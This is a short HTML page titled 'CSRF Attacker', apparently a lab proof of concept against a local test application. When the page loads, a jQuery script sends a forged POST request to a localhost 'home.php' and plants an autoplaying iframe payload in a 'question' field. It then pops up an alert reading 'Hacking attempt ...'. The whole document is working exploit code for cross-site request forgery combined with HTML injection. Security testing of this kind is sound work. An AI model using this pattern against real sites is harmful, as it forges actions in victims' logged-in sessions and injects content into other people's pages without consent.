<!DOCTYPE html>
<html lang "en">
    <head>
        <meta charset="UTF-8">
        <title>CSRF Attacker</title>
    </head>
<body>
    <iframe id = "hack" width="1500" height="720" src="https://www.youtube.com/embed/R_Gmiw2SnuI?autoplay=1&mute=1&loop=1" frameborder="0" allow="autoplay" allowfullscreen></iframe>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script>
        $.ajax({
            'url': 'http://localhost/Secure Version/home.php',
            'type': 'post',
            'data': { 'question': '<iframe id = "hack" width="560" height="315" src=\"https://www.youtube.com/embed/R_Gmiw2SnuI?autoplay=1&mute=1&loop=1\" frameborder="0" allowfullscreen allow="autoplay");\"></iframe>' }
        });
        alert('Hacking attempt ...')
    </script>
</body>
</html>
